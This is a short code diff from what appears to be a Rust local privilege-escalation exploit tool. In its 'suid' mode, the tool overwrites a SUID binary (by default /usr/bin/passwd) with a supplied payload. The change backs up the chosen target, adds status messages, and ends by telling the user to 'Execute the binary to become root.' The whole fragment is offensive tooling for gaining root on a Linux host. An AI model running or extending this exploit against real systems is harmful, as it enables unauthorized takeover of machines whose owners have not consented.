@@ -55,6 +55,7 @@ fn main() -> Result<(), anyhow::Error> {
         "suid" => {
             let suid_payload = opt.input.unwrap_or(PathBuf::from("./suid"));
             let target_suid = opt.output.unwrap_or(PathBuf::from("/usr/bin/passwd"));
+            println!("[-] Target {} will be overwritten with {}", target_suid.to_str().unwrap(), suid_payload.to_str().unwrap());
 
             // Ensure payload exists.
             if !Path::new(&suid_payload).exists() {
@@ -68,8 +69,10 @@ fn main() -> Result<(), anyhow::Error> {
                 return Err(anyhow!("Target SUID binary to overwrite doesn't exist!"));
             }
 
-            helpers::backup_file(&PathBuf::from("/usr/bin/passwd")).unwrap();
-            return exploit::exploit(suid_payload, target_suid.into(), 0);
+            helpers::backup_file(&PathBuf::from(&target_suid)).unwrap();
+            exploit::exploit(suid_payload, target_suid.into(), 0)?;
+            println!("[-] SUID binary overwritten. Execute the binary to become root.");
+            return Ok(());
         }
 
         _ => {
